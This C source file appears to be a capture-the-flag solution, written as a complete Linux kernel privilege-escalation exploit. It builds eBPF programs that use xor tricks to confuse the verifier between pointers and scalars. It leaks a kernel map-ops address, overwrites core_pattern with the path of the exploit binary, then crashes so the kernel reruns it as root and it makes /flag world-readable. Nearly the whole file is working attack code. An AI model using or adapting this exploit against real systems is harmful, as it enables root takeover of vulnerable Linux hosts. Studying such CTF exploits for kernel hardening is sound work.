/*
  Copyright 2021 Google LLC
 
  Licensed under the Apache License, Version 2.0 (the "License");
  you may not use this file except in compliance with the License.
  You may obtain a copy of the License at
 
      https://www.apache.org/licenses/LICENSE-2.0
 
  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
*/

#define _GNU_SOURCE
#include <assert.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <unistd.h>
#include <fcntl.h>

#include <linux/bpf.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#undef NDEBUG

// https://www.kernel.org/doc/Documentation/networking/filter.txt
// eBPF has one 16-byte instruction: BPF_LD | BPF_DW | BPF_IMM which consists
// of two consecutive 'struct bpf_insn' 8-byte blocks and interpreted as single
// instruction that loads 64-bit immediate value into a dst_reg.
// When src_reg != 0 then it's used to represent operations that load maps or
// other special values.
// https://elixir.bootlin.com/linux/v5.12.9/source/include/uapi/linux/bpf.h#L365
#define bpf_ldimm64_or_special(dst_reg, src_reg, imm) \
    bpf_insn(BPF_LD | BPF_DW | BPF_IMM, (dst_reg), (src_reg), 0, (imm) & 0xffffffff), \
    bpf_insn(0, 0, 0, 0, (uint64_t)(imm) >> 32)

#define bpf_load_imm64(dst_reg, imm) bpf_ldimm64_or_special(dst_reg, 0, imm)

// When src_reg == BPF_PSEUDO_MAP_FD, this loads the address of a map into a register
#define bpf_load_map(dst_reg, mapfd) bpf_ldimm64_or_special(dst_reg, BPF_PSEUDO_MAP_FD, mapfd)

// Adjust these if you recompile the kernel
// The build script exports symbols.txt into the challenge folder, grep for
// core_pattern and array_map_ops to get the addresses.
const uint64_t core_pattern_base = 0xffffffff8295fee0; // 0xffffffff8295fee0;
const uint64_t array_map_ops_base = 0xffffffff8239d4c0; // 0xffffffff8239cb00;

// Adjust this with the actual path to our exploit.
const char path_to_exploit[] = "|/tmp/p\x00";


static char verifier_log[8192];

static struct bpf_insn bpf_insn(uint8_t opcode, uint8_t dst_reg, uint8_t src_reg, int16_t off, int32_t imm)
{
  struct bpf_insn ret = {
    .code = opcode,
    .dst_reg = dst_reg,
    .src_reg = src_reg,
    .off = off,
    .imm = imm,
  };

  return ret;
}

static struct bpf_insn bpf_load_imm32(uint8_t dst_reg, int32_t imm)
{
  return bpf_insn(BPF_ALU64 | BPF_MOV | BPF_K, dst_reg, 0, 0, imm);
}

static struct bpf_insn bpf_exit(void)
{
  return bpf_insn(BPF_JMP | BPF_EXIT, 0, 0, 0, 0);
}

static struct bpf_insn bpf_xor_imm32(uint8_t dst_reg, int32_t imm)
{
  return bpf_insn(BPF_ALU64 | BPF_XOR | BPF_K, dst_reg, 0, 0, imm);
}

static struct bpf_insn bpf_xor_reg(uint8_t dst_reg, uint8_t src_reg)
{
  return bpf_insn(BPF_ALU64 | BPF_XOR | BPF_X, dst_reg, src_reg, 0, 0);
}

static struct bpf_insn bpf_add_imm32(uint8_t dst_reg, int32_t imm)
{
  return bpf_insn(BPF_ALU64 | BPF_ADD | BPF_K, dst_reg, 0, 0, imm);
}

static struct bpf_insn bpf_sub_reg64(uint8_t dst_reg, uint8_t src_reg)
{
  return bpf_insn(BPF_ALU64 | BPF_SUB | BPF_X, dst_reg, src_reg, 0, 0);
}

static struct bpf_insn bpf_mov_reg_reg(uint8_t dst_reg, uint8_t src_reg)
{
  return bpf_insn(BPF_ALU64 | BPF_MOV | BPF_X, dst_reg, src_reg, 0, 0);
}

static struct bpf_insn bpf_call(int32_t function)
{
  return bpf_insn(BPF_JMP | BPF_CALL, 0, 0, 0, function);
}

static struct bpf_insn bpf_jne_imm(uint8_t reg, int16_t dest, int32_t imm)
{
  return bpf_insn(BPF_JMP | BPF_JNE | BPF_K, reg, 0, dest, imm);
}

// *(int32_t *)(base + offset) = imm
static struct bpf_insn bpf_store_imm32(uint8_t base, int16_t offset, int32_t imm)
{
  return bpf_insn(BPF_MEM | BPF_ST | BPF_W, base, 0, offset, imm);
}

// dst = *(uint64_t *)(base + offset)
static struct bpf_insn bpf_load_reg64(uint8_t dst, uint8_t base, int16_t offset)
{
  return bpf_insn(BPF_MEM | BPF_LDX | BPF_DW, dst, base, offset, 0);
}

// *(uint64_t *)(base + offset) = src
static struct bpf_insn bpf_store_reg64(uint8_t base, int16_t offset, uint8_t src)
{
  return bpf_insn(BPF_MEM | BPF_STX | BPF_DW, base, src, offset, 0);
}

static int load_prog(const struct bpf_insn *instructions, size_t size)
{
  union bpf_attr attr = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insns = (uint64_t)instructions,
    .insn_cnt = size,
    .license = (uint64_t)"GPL",
    .log_level = 2,
    .log_buf = (uint64_t)verifier_log,
    .log_size = sizeof(verifier_log),
  };

  int ret = syscall(SYS_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
  if (ret < 0) {
    printf("Verifier returned %d, log: %s\n", ret, verifier_log);
  }
  return ret;
}

static int create_map(void)
{
  union bpf_attr attr = {
    .map_type = BPF_MAP_TYPE_ARRAY,
    .key_size = 4,
    .value_size = 8,
    .max_entries = 0x100,
  };

  return syscall(SYS_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static uint64_t read_map(int mapfd)
{
  uint64_t out = 0;
  uint64_t key = 0;

  union bpf_attr attr = {
    .map_fd = mapfd,
    .key = (uint64_t)&key,
    .value = (uint64_t)&out,
  };

  assert(syscall(SYS_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr)) >= 0);
  return out;
}

int main(void)
{
  if (getuid() == 0) {
    // The kernel ran us as the core handler (as root),
    // change the permissions of the flag or something
    system("chmod 777 /flag");
    return 0;
  }

  int mapfd = create_map();
  assert(mapfd >= 0);

  const struct bpf_insn instructions[] = {
    // Store the map in r1
    bpf_load_map(BPF_REG_1, mapfd),
    // Store the index (0) on the stack and a pointer to it in r2
    bpf_store_imm32(BPF_REG_10, -4, 0),
    bpf_mov_reg_reg(BPF_REG_2, BPF_REG_10),
    bpf_add_imm32(BPF_REG_2, -4),
    // Get a pointer to the value in r0
    bpf_call(BPF_FUNC_map_lookup_elem),
    // Exit if it's NULL to make the verifier happy
    bpf_jne_imm(BPF_REG_0, 1, 0),
    bpf_exit(),

    // to scalar
    bpf_xor_imm32(BPF_REG_0, 0),
    bpf_mov_reg_reg(BPF_REG_4, BPF_REG_0),
    bpf_mov_reg_reg(BPF_REG_5, BPF_REG_0),

    // to pointer and zero r4
    bpf_xor_reg(BPF_REG_4, BPF_REG_4),
    // to scalar
    bpf_xor_imm32(BPF_REG_4, 0),

    // Move to the beginning of the struct where the ops pointer is stored
    bpf_add_imm32(BPF_REG_5, -0x110),
    bpf_xor_reg(BPF_REG_4, BPF_REG_5),
    // Read it out
    bpf_load_reg64(BPF_REG_5, BPF_REG_4, 0),

    // Compute the address of core_pattern
    bpf_load_imm32(BPF_REG_4, (int64_t)(array_map_ops_base - core_pattern_base)),
    bpf_sub_reg64(BPF_REG_5, BPF_REG_4),
    bpf_xor_imm32(BPF_REG_0, 0),
    bpf_store_reg64(BPF_REG_0, 0, BPF_REG_5),

    // Exit
    bpf_load_imm32(BPF_REG_0, 0),
    bpf_exit(),
  };

  // Create and attach the filter
  int sockets[2];
  int progfd = load_prog(instructions, ARRAY_SIZE(instructions));
  assert(progfd >= 0);
  assert(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets) >= 0);
  assert(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) >= 0);

  // Run the filter
  write(sockets[0], "AAAA", 4);

  uint64_t core_pattern = read_map(mapfd);
  printf("core_pattern: %#lx\n", core_pattern);

  const struct bpf_insn instructions2[] = {
    // Store the map in r1
    bpf_load_map(BPF_REG_1, mapfd),
    // Store the index (0) on the stack and a pointer to it in r2
    bpf_store_imm32(BPF_REG_10, -4, 0),
    bpf_mov_reg_reg(BPF_REG_2, BPF_REG_10),
    bpf_add_imm32(BPF_REG_2, -4),
    // Get a pointer to the value in r0
    bpf_call(BPF_FUNC_map_lookup_elem),
    // Exit if it's NULL to make the verifier happy
    bpf_jne_imm(BPF_REG_0, 1, 0),
    bpf_exit(),

    // Turn it into a scalar
    bpf_xor_imm32(BPF_REG_0, 0),
    // Zero it (back to pointer)
    bpf_xor_reg(BPF_REG_0, BPF_REG_0),
    // Back to scalar
    bpf_xor_imm32(BPF_REG_0, 0),

    // Xor it with the address of core_pattern (back to pointer)
    bpf_load_imm64(BPF_REG_3, core_pattern),
    bpf_xor_reg(BPF_REG_0, BPF_REG_3),

    // Overwrite core_pattern with the path to our exploit
    bpf_load_imm64(BPF_REG_3, *(uint64_t *)path_to_exploit),
    bpf_store_reg64(BPF_REG_0, 0, BPF_REG_3),

    // Exit
    bpf_load_imm32(BPF_REG_0, 0),
    bpf_exit(),
  };

  int progfd2 = load_prog(instructions2, ARRAY_SIZE(instructions2));
  assert(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd2, sizeof(progfd2)) >= 0);
  write(sockets[0], "AAAA", 4);

  // Crash and run ourselves as the core handler
  asm volatile("ud2");

  return 0;
}
